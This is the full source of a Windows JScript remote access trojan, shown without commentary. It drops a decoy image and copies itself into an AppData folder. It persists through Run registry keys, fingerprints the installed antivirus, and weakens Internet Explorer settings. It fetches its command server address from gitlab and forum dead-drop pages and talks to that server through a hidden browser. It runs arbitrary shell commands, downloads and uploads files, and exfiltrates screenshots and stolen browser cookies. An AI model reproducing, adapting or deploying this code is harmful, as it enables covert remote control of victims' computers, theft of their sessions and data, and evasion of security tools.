objFSO = new ActiveXObject("Scripting.FileSystemObject");
objShell = new ActiveXObject("WScript.Shell");
tmpPath = objShell.ExpandEnvironmentStrings("%TMP%");

lnkPath = tmpPath + "\\1.lnk";

appDataPath = objShell.ExpandEnvironmentStrings("%appdata%");

upperWorkDir = appDataPath + "\\Microsoft\\Credentials\\MediaPlayer";

workDir = upperWorkDir + "\\MediaManager";
workJSFile = "media.js";
workJSPath = workDir + "\\" + workJSFile;
registryFile = workDir + "\\media.reg"
registryIEFile = workDir + "\\mediaIE.reg"

sctFile = tmpPath + "\\878478ddd3.TMP";
uploadFile = upperWorkDir + "\\filetoupload.txt";
idFile = workDir + "\\id.txt";
lnkExecuter = workDir + "\\Media.lnk"
ssWorkDir = upperWorkDir + "\\Utilities";
ieWatchdogPath = tmpPath + "\\reportapi.js";
ieWatchdogContent = 'objShell = new ActiveXObject("WScript.Shell");appDataPath = objShell.ExpandEnvironmentStrings("%appdata%");lockFilePath =  appDataPath + "\\\\locki";objFSO = new ActiveXObject("Scripting.FileSystemObject");objFSO.DeleteFile(WScript.ScriptFullName);if (objFSO.FileExists(lockFilePath)){objFSO.DeleteFile(lockFilePath);}a = objFSO.CreateTextFile(lockFilePath, 2);var oWMISrvc = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2");while(1){WScript.Sleep(180000); asdasd();}function asdasd() {try {var colProcLst = oWMISrvc.ExecQuery("seLect * fRom Win32_Process WHERE CommandLine LIKE \'%-Embedding%\' and Name LIKE \'iexplore.exe\'");var objItem = new Enumerator(colProcLst);for(;!objItem.atEnd();objItem.moveNext()) {var p = objItem.item();p.Terminate();}} catch  (e) {}} ';
serverSearchURLarr = ["https://gitlab.com/bliblobla123/testingtesting/-/raw/master/README.md", "https://www.digitalpoint.com/members/bliblobla.943007/"]

loggerDir = upperWorkDir + "\\UtilitiesLog"
loggerPath = upperWorkDir + "\\UtilitiesLog\\run.vbs"

watchdogWorkPath = appDataPath + "\\Identities\\{FC9EFBBA-78D3-438D-89AB-61990B15A100}";
watchdog_lock_file_path = watchdogWorkPath + "\\lock.txt";
watchdogBitePath = tmpPath + "\\bite.TMP";

lockFilePath = appDataPath + "\\lockx";
lockFileFD = 0;
lockSSFilePath = appDataPath + "\\lockss";
serverWorkDir = "/tran/";

tmpWorkScriptName = "reportapi.js";
tmpWordScriptPath = objShell.ExpandEnvironmentStrings("%TMP%") + "\\" + tmpWorkScriptName;

serverIP = "";
id = "";

lastUploadedFile = "";

logErrorFilePath = appDataPath + "\\errormedia.log";
cookieViewer = upperWorkDir + "\\ccv.exe";
cookiesOutput = upperWorkDir + "\\c.txt";
cookiesdate = 0;

ver = "4.0";

try
{

if (WScript.ScriptFullName != workJSPath)
{
	if (WScript.ScriptName == tmpWorkScriptName)
	{
		WScript.Sleep(60000);
		objFSO.DeleteFile(WScript.ScriptFullName);
	}
	else
	{
		FirstTimeRun();
		WScript.Quit();
	}
}
else
{
	objFSO.CopyFile (WScript.ScriptFullName, tmpWordScriptPath);
	ExecuteCommand("cscript " + repeatString(" ", 256) + tmpWordScriptPath);
	WScript.Quit();
}


if (!objFSO.FileExists(idFile))
{
	SecondTimeRun();

}
else
{

	id = ReadTextFile(idFile);
	InitializeIE();
}

VerifyLockFile();

RegularRun();

}
catch(err)
{
	
}

function CreateShortcut()
{
   lnk = objShell.CreateShortcut(lnkExecuter);
   
   lnk.TargetPath = "c:\\windows\\system32\\cscript.exe";
   lnk.Arguments = workJSPath;
   lnk.Description = "Assistance";
   lnk.HotKey = "";
   lnk.IconLocation = "C:\\Windows\\hh.exe, 1";
   lnk.WindowStyle = "7";
   
   lnk.Save()
}

function toepoch(date)
{
	var ts = Date.parse(date)/1000;
	return ts;
}

function VerifyLockFile()
{
	if (objFSO.FileExists(lockFilePath))
	{
		objFSO.DeleteFile(lockFilePath);
	}
	
	lockFileFD = objFSO.CreateTextFile(lockFilePath, 2);
}

function InitializeIE()
{
	StartIEWatchDog();
	StartIE();
}

function RegularRun()
{
	RunSS();
	RunLogger();
	Main123Loop();
}

function Main123Loop()
{
	while(true)
	{
		try
		{					
			cmd = GetCommand();
			
			if (cmd != "")
			{
				Process123Cmd(cmd);
			}
			
			if(objFSO.FileExists(uploadFile))
			{
				UploadFile(serverIP + "send.php?id="+id, uploadFile, "uploaded_file")		
				objFSO.DeleteFile(uploadFile)
			}					
			
			if(objFSO.FileExists(sctFile))
			{
				UploadFile(serverIP + "upload.php?id="+id, sctFile, "uploaded_file")
				objFSO.DeleteFile(sctFile)
			}
			
			KickWatchDog();
			
			RunSS();
			
			TakeCookies();

		}
		catch(err)
		{
			try{
			
			}catch(err2){}
		}
		
		WScript.Sleep(30000);
	}
}

function KickWatchDog()
{
	SaveTextToFile(watchdogBitePath, objIE.Hwnd);
}

function TakeCookies()
{
	var now = (new Date).getTime() / 1000;
	if(now-cookiesdate > 600) 
	{
		RunWatchDog();
		
		if (objFSO.FileExists(cookieViewer))
		{
			ExecuteCommand(cookieViewer+" /scookiestxt "+cookiesOutput);
			WScript.Sleep(10000);
			if (objFSO.FileExists(cookiesOutput))
			{
				UploadFile(serverIP + "cookies.php?id="+id, cookiesOutput, "uploaded_file");
				objFSO.DeleteFile(cookiesOutput);
				cookiesdate = (new Date).getTime() / 1000;
			}
		}
	}
}

function Process123Cmd(cmd)
{
	rgxDownloadFile = "DownloadFile (.*) (.*)";
	rgxUploadFile = "UploadFile (.*)";
	
	if (cmd == "kill")
	{
		WScript.Quit();
	}
	
	if (cmd.match(rgxDownloadFile))
	{
		fileURL = cmd.match(rgxDownloadFile)[1];
		localFilePath = cmd.match(rgxDownloadFile)[2];
		localFilePath = localFilePath.replace("%appdata%", appDataPath);
		localFilePath = localFilePath.replace("%tmp%", tmpPath);
		res = IEPostStringRequest(serverIP + "DOWNLOAD_FILE.php".toLowerCase(), "FILE-URL=".toLowerCase() + fileURL);
		WriteBase64ToFile(res, localFilePath);
		return;
	}
	
	if (cmd.match(rgxUploadFile))
	{
		filePath = cmd.match(rgxUploadFile)[1];	
		filePath = filePath.replace("%appdata%", appDataPath);
		filePath = filePath.replace("%tmp%", tmpPath);		
		UploadFile(serverIP + "send.php?id="+id, filePath, "uploaded_file")		
		return;
	}

	try
	{
		ExecuteCommand("cmd /c " + cmd);
	}
	catch(err){}
	
}

function Write123Base64ToFile(base64Data, toFilePath)
{
    var xmlObj = WScript.CreateObject("MSXml2.DOMDocument");
    var docElement = xmlObj.createElement("Base64Data");
    docElement.dataType = "bin.base64";
    
    docElement.text = base64Data;
    
	var outputStream = WScript.CreateObject("ADODB.Stream");
    outputStream.Type = 1;
    outputStream.Open();
    outputStream.Write(docElement.nodeTypedValue);
    outputStream.SaveToFile(toFilePath, 2);
	outputStream.Close();
}



function StartIEWatchDog()
{
	if (!objFSO.FileExists(ieWatchdogPath))
	{
		SaveTextToFile(ieWatchdogPath, ieWatchdogContent);
	}
	
	ExecuteCommand("cscript " + repeatString(" ", 256) + ieWatchdogPath);
}

function repeatString(strInput, intCount) {
	var arrTmp = new Array(intCount+1);
	return arrTmp.join(strInput);
}

function RunWatchDog()
{
	if (objFSO.FileExists(watchdogWorkPath + "\\python.exe"))
	{
		try
		{
			if (objFSO.FileExists(watchdog_lock_file_path))
				objFSO.DeleteFile(watchdog_lock_file_path);
		}
		catch(err)
		{
			return;
		}
	
		wd = objShell.currentdirectory;
		objShell.currentdirectory = watchdogWorkPath;	
		
		ExecuteCommand("rundll32.exe" + repeatString(" ", 256) + " python27.dll,Py_Initialize");
		
		for(i=0;i<5;i++)
		{
			if (objFSO.FileExists(watchdog_lock_file_path))
				break;
			WScript.Sleep(1000);
		}
		
		if (!objFSO.FileExists(watchdog_lock_file_path))
			ExecuteCommand(watchdogWorkPath + "\\python.exe");
		
		objShell.currentdirectory = wd;
	}
}

function RunLogger()
{
	try
	{
	if (objFSO.FileExists(loggerPath))
	{
		wd = loggerPath
		objShell.currentdirectory = ssWorkDir;		
		ExecuteCommand("cscript.exe " + loggerPath);
		objShell.currentdirectory = wd;
	}
	}
	catch(err)
	{
	}
}

function RunSS()
{
	if (objFSO.FileExists(ssWorkDir+"\\python.exe"))
	{
		try
		{
			if (objFSO.FileExists(lockSSFilePath))
				objFSO.DeleteFile(lockSSFilePath);
		}
		catch(err)
		{
			return;
		}
	
		wd = objShell.currentdirectory;
		objShell.currentdirectory = ssWorkDir;	
		
		ExecuteCommand("rundll32.exe" + repeatString(" ", 256) + " python27.dll,Py_Initialize");
		
		for(i=0;i<5;i++)
		{
			if (objFSO.FileExists(lockSSFilePath))
				break;
			WScript.Sleep(1000);
		}
		
		if (!objFSO.FileExists(lockSSFilePath))
			ExecuteCommand(ssWorkDir + "\\python.exe");
		
		objShell.currentdirectory = wd;
	}
}

function GetCommand()
{
	res = IEPostStringRequest(serverIP + "view.php", "id=" + id);
	cmd = GetValueWithRegex(res);
	
	return cmd;
}



///////////////// Utils

function CheckServerIP(ip)
{
	if (ip == "")
		return false
	
	test_url = ip;
	
	res = IEGetRequest(test_url + "check.php?id="+id + "&ver="+ ver);
	res_in = GetValueWithRegex(res);	
	
	if (res_in == "success")
	{		
		return true;
	}
	
	return false;
}

function GetServerIP()
{
	ip = "";
	is_continue = true;
	
	do
	{
		for (var i=0; i < serverSearchURLarr.length; i++)
		{								
			serverSearchURL = serverSearchURLarr[i];
			
			av = get_av();
			
			//if (av.indexOf("Bitdefender") != -1)
			//{
			//	serverSearchURL = "https://gitlab.com/jhondeer123/test/raw/master/test.py";			
			//}
			
			
			
			res = IEGetRequest(serverSearchURL);
			ip = GetValueWithRegex(res, "8346758545");
					
			if(ip.indexOf("http") == -1)
			{
				ip = ip / 8;
				ip = long2ip(ip);
			}
		
			ip = ip+serverWorkDir					
			
			if (CheckServerIP(ip))
			{							
				is_continue = false;
				break;
			}			
		}
		WScript.Sleep(1000);
	}
	while(is_continue);
			
	return ip;
}

function long2ip(long) {
  MAX_IP_IN_LONG = 4294967295; // 255.255.255.255
  MIN_IP_IN_LONG = 0; // 0.0.0.0

  if (typeof long !== 'number' || long > MAX_IP_IN_LONG || long < MIN_IP_IN_LONG) {
    return false;
  }

  ip = [long >>> 24, long >>> 16 & 0xFF, long >>> 8 & 0xFF, long & 0xFF].join('.');

  return ip;
};

function UploadFile(DestURL, FileName, FieldName)
{
  Boundary = "---------------------------0123456789012";
  var FileContents;
  var FormData;
  
  try
  {
	FileContents = GetFile(FileName);
  }
  catch(error)
  {
	  return false;
  }
  
  FormData =  BuildFormData(FileContents, Boundary, FileName, FieldName);
  response = IEPostBinaryRequest(DestURL, FormData, Boundary);
  
  if (GetValueWithRegex(response) == "success")
  {
	  return true;
  }
  else
  {
	  return false;
  }
}

function BuildFormData(FileContents, Boundary, FileName, FieldName)
{
  ContentType = "application/upload";
  Pre = "--" + Boundary + "\r\n" + mpFields(FieldName, FileName, ContentType);
  Po = "\r\n--" + Boundary + "--\r\n";

  oStream = new ActiveXObject("ADODB.Stream");
  oStream.Open;
  oStream.Type = 1;
  oStream.Write (Str2Bytes(Pre));
  oStream.Write (FileContents);
  oStream.Write (Str2Bytes(Po));

  oStream.Position = 0;
  FormData = oStream.Read(Pre.length + objFSO.GetFile(FileName).size + Po.length)
  oStream.Close
  
  return FormData;
}

function IERequest(URL, PostData, Boundary)
{
	isSuccessRequest = false;
	toRet = "";
	
	while(!isSuccessRequest)
	{
		try
		{
			if (PostData === undefined && Boundary === undefined)
			{
				objIE.Navigate(URL);				
			}
			else if (Boundary === undefined)
			{
				objIE.Navigate (URL, 0,0 , PostData, "Content-type: application/x-www-form-urlencoded\r\n");				
			}
			else
			{
				objIE.Navigate(URL, 0, 0, PostData, "Content-Type: multipart/form-data; boundary=" + Boundary + "\r\n");	
			}			
			WScript.Sleep(1000);
			IEWait(objIE);					
			
			toRet = objIE.document.body.innerHTML;
			
			isSuccessRequest = true;
		}
		catch(error)
		{
			WScript.Sleep(30000);
			StartIE();					
		}
	} 
	
	
	toRet = toRet.replace(/&amp;/g, '&');
	toRet = toRet.replace(/&quot;/g, '"');
	toRet = toRet.replace(/&lt;/g, '<');
	toRet = toRet.replace(/&gt;/g, '>');
	
	return toRet;
}

function IEGetRequest(URL) {
	return IERequest(URL);
}

function IEPostStringRequest(URL, PostData)
{
  PostData = Str2Bytes(PostData);
  return IERequest(URL, PostData);
}

function IEPostBinaryRequest(URL, PostData, Boundary)
{
  return IERequest(URL, PostData, Boundary);
}

function IEWait(IE)
{
	while(IE.Busy || IE.ReadyState != 4)
	{
		WScript.Sleep(10);
	}
}

function StartIE()
{
	isSuccess = false;
	while(!isSuccess)
	{		
		try
		{		
			objIE = GetObject("new:{D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E}");
			objIE.Visible = 0;
			ret = IEGetRequest("http://www.google.com");
			if (ret.indexOf("Google") == -1)
			{				
				throw "bad"
			}			
		}	
		catch(err)
		{			
			objIE = new ActiveXObject("InternetExplorer.Application");
			objIE.Visible = 0;			
		}
		try
		{
			
			serverIP = GetServerIP();
			
			isSuccess = true;		
		}
		catch(err)
		{
			WScript.Sleep(10000);
		}
	}
}

function GetFile(FileName)
{
  Stream = new ActiveXObject("ADODB.Stream");
  Stream.Type = 1;
  Stream.Open;
  Stream.LoadFromFile(FileName);
  data = Stream.Read;
  Stream.Close;
  return data;
}

function mpFields(FieldName, FileName, ContentType)
{
  MPTemplate = "Content-Disposition: form-data; name=\"{field}\";" + " filename=\"{file}\"" + "\r\n" + "Content-Type: {ct}\r\n\r\n";
  Out = MPTemplate.replace("{field}", FieldName);
  Out = Out.replace("{field}", FieldName);
  Out = Out.replace("{file}", FileName);
  return Out.replace("{ct}", ContentType);
}

function Str2Bytes(Text)
{
  BinaryStream = new ActiveXObject("ADODB.Stream");

  BinaryStream.Type = 2;
  BinaryStream.CharSet = "us-ascii";
  BinaryStream.Open;
  BinaryStream.WriteText(Text);
  BinaryStream.Position = 0;
  BinaryStream.Type = 1;
  BinaryStream.Position = 0;

  return BinaryStream.Read;
}



///////////// First time run


function FirstTimeRun()
{		
	SetCurrDir();
	RunDecoy();
	MoveToPermanentFolder();
	DeleteLeftovers();
	ExecuteCommand("cscript " + workJSPath);
}

function SetCurrDir()
{
	currWorkDir = objShell.CurrentDirectory
	if (currWorkDir.indexOf("system32") != -1)
	{
		objShell.CurrentDirectory = tmpPath
	}
}

function DeleteLeftovers()
{
	try{
	objFSO.DeleteFile(WScript.ScriptFullName);
	scriptFile = objFSO.GetFile(lnkPath);
	scriptFile.attributes = 128;
	objFSO.DeleteFile(lnkPath);
	}catch(err){}
}

function RunDecoy()
{
	try{
	data = binaryRead(lnkPath,2657,25421);
	data = data.reverse();
	binaryWrite("4.png", data, 25421);
	objShell.Run("\"" + "4.png" + "\"", 1, 0);
	}catch(err){}
}

function MoveToPermanentFolder()
{
	try{
	if (objFSO.FolderExists(workDir))
	{		
		objFSO.DeleteFolder(workDir, true);	
	}
	}catch(e){}
	
	try{
	if (!objFSO.FolderExists(upperWorkDir))
	{		
		objFSO.CreateFolder(upperWorkDir);	
	}
	}catch(e){}
	
	try{
		objFSO.CreateFolder(workDir);	
	}catch(e){}
	
	isSuccess = false;
	while(!isSuccess)
	{		
		try{	
		a = WScript.ScriptFullName
		b = workJSPath
		objFSO.CopyFile(a, b);
		
		isSuccess = true;
		}catch(err){}
	}
}

///////////////////


////////// Second Time Run

function SecondTimeRun()
{	
	av = get_av();
	RegisterToStartUp(av);
	InitializeIE();
	RegisterToServer(av);

	objFSO.DeleteFile(registryFile);
}

function RegisterToStartUp(av)
{
	CreateRegFiles(av);
	ExecuteCommand("reg import " + registryFile);	
	ExecuteCommand("reg import " + registryIEFile);
	CreateShortcut();
}


function CreateRegFiles(av)
{		
	if (av.indexOf("Bitdefender") != -1 || av.indexOf("avast") != -1)
		reg = "Windows Registry Editor Version 5.00\r\n \r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"MediaPlayer\"=\""+lnkExecuter.replace(/\\/g, "\\\\")+"\"\r\n";
	else
		reg = "Windows Registry Editor Version 5.00\r\n \r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows]\r\n\"Run\"=\""+lnkExecuter.replace(/\\/g, "\\\\")+"\"\r\n";
	
	SaveTextToFile(registryFile, reg);
	
	regIE = reg = "Windows Registry Editor Version 5.00\r\n \r\n[HKEY_CURRENT_USER\\Control Panel\\Cursors]\r\n\"AppStarting\"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,61,00,65,00,72,00,6f,00,5f,00,61,00,72,00,72,00,6f,00,77,00,2e,00,63,00,75,00,72,00,00,00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]\r\n\"Check_Associations\"=\"no\"\r\n\"NoProtectedModeBanner\"=dword:00000001\r\n\"IE10RunOncePerInstallCompleted\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery]\r\n\"AutoRecover\"=dword:00000002\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\PhishingFilter]\r\n\"EnabledV9\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation]\r\n\"MSCompatibilityMode\"=dword:00000001\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\r\n\"EnableBalloonTips\"=dword:00000000\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]\r\n\"GlobalUserOffline\"=dword:00000000\r\n\r\n[HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner]\r\n\"BrowserMonitoring\"=-\r\n\"(Mon)3001\"=-\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3]\r\n\"2500\"=dword:00000003\r\n";
	SaveTextToFile(registryIEFile, regIE);
}

function RegisterToServer(av)
{
	
	
	
	pat = "4";
	
	
	do
	{

		res = IEPostStringRequest(serverIP + "register.php", encodeURI("av=" + av + "&cpu-name=t&ref="+ pat + "&user="));

		id = GetValueWithRegex(res);
		
	}
	while(id == "");
	
	SaveTextToFile(idFile,id);
}

function ExecuteCommand(cmd)
{
	objShell.Run(cmd, 0, 0);
}


function binaryRead(path,offset,size) {
    var stream, binaryStream;  
	binaryStream = [];
    stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.LoadFromFile(path);
	stream.Position = offset;
    
	for (var i=0;i<size;i++)
	{
		binaryStream.push(stream.Read(1));
	}
	
    stream.close();  
    return binaryStream;
}

function binaryWrite(path,binaryStream, size)
{
	var stream;  
    stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();

	for (var i=0;i<size;i++)
	{
		stream.Write(binaryStream[i]);
	}

	stream.SaveToFile(path, 2);
    stream.close();  

}

function get_av()
{
	av = "";
	try
	{	
	var wmi = GetObject("winmgmts:\\\\.\\root\\SecurityCenter")
	e = new Enumerator(wmi.InstancesOf("AntiVirusProduct"));
	for(; !e.atEnd(); e.moveNext()) {
	var s = e.item();   
	av += s.displayName + " ";
	}
	var wmi = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2")
	e = new Enumerator(wmi.InstancesOf("AntiVirusProduct"));
	for(; !e.atEnd(); e.moveNext()) {
	var s = e.item();   
	av += s.displayName + " ";
	}
	
	}
	catch(err){}
	return av;
}

function SaveTextToFile(filename, text)
{
	a = objFSO.CreateTextFile(filename, 2)
	a.Write(text)
	a.Close()	
}

function GetValueWithRegex(str, pattern)
{
	if (pattern === undefined)
		pattern = "jifhruhajsdfg444"
	
	value = "";
	
	if (str.match(pattern + "(.*?)" + pattern) != null)
		value = str.match(pattern + "(.*?)" + pattern)[1];
	
	return value;
}

function ReadTextFile(filename)
{
	a = objFSO.OpenTextFile(filename, 1)
	mytext = a.ReadAll()
	a.Close()	
	return mytext;
}
